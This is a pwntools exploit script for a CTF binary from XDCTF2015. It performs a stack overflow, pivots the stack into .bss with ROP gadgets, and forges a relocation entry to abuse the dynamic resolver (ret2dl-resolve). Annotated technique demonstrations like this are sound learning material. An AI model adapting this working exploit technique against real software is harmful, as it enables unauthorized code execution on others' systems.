from pwn import *
elf = ELF('./parelro_x86')
offset = 112
read_plt = elf.plt['read']

ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"
pop_ebp_ret = 0x0804861b
leave_ret = 0x08048458 # ROPgadget --binary bof --only "leave|ret"

stack_size = 0x800
bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"
plt_0 = 0x08048380 # objdump -d -j .plt bof  执行 <push link_map，jmp dl_resolve>
rel_plt = 0x08048330 # objdump -s -j .rel.plt bof

# 栈迁移的目的地
base_stage = bss_addr + stack_size

index_offset = (base_stage + 28) - rel_plt # base_stage + 28指向fake_reloc，减去rel_plt即偏移
write_got = elf.got['write']
r_info = 0x607 # write: Elf32_Rel->r_info，查看r_info：readelf -r parelro_x86 | grep 'write'
fake_reloc = p32(write_got) + p32(r_info)


r = process('./parelro_x86')

r.recvuntil('Welcome to XDCTF2015~!\n')
payload = b'A' * offset
payload += p32(read_plt) # 读100个字节到base_stage
payload += p32(ppp_ret)
payload += p32(0)
payload += p32(base_stage)
payload += p32(100)
payload += p32(pop_ebp_ret) # 把base_stage pop到ebp中
payload += p32(base_stage)
payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stage
r.sendline(payload)

cmd = b"/bin/sh"

# stage2: 栈迁移，调plt[0]，传入伪造的 index_offset，指向我们自定义的.rel.plt表项内容
# --------> base_stage
payload2 = b'AAAA' # 接上一个payload的leave->pop ebp ; ret
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += b'AAAA'
payload2 += p32(1)
payload2 += p32(base_stage + 80)
payload2 += p32(len(cmd))
payload2 += fake_reloc
payload2 += b'A' * (80 - len(payload2))
payload2 += cmd + b'\x00'
payload2 += b'A' * (100 - len(payload2))

r.sendline(payload2)
r.interactive()